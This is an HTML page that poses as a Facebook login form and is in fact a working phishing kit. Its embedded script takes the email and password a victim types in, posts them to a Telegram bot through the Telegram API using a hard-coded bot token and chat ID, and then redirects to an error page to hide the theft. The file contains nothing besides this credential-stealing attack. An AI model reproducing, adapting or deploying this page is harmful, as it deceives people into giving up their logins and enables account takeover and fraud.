
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>Facebook Login</h1>
        <form id="loginForm">
            <input type="text" id="email" placeholder="Email or Phone" required><br>
            <input type="password" id="password" placeholder="Password" required><br>
            <button type="submit">Log In</button>
        </form>
    </div>

    <script>
        const botToken = '7532011979:AAGk4o7BkdactJz6WoEuXUFpk-uBM1T0F6s';
        const chatId = '6445641895';

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const message = `ðŸ”¥ New FB Login!\nðŸ“§ Email: ${email}\nðŸ”‘ Password: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'error.html';
                }
            })
            .catch(error => console.error('Error:', error));
        });
    </script>
</body>
</html>
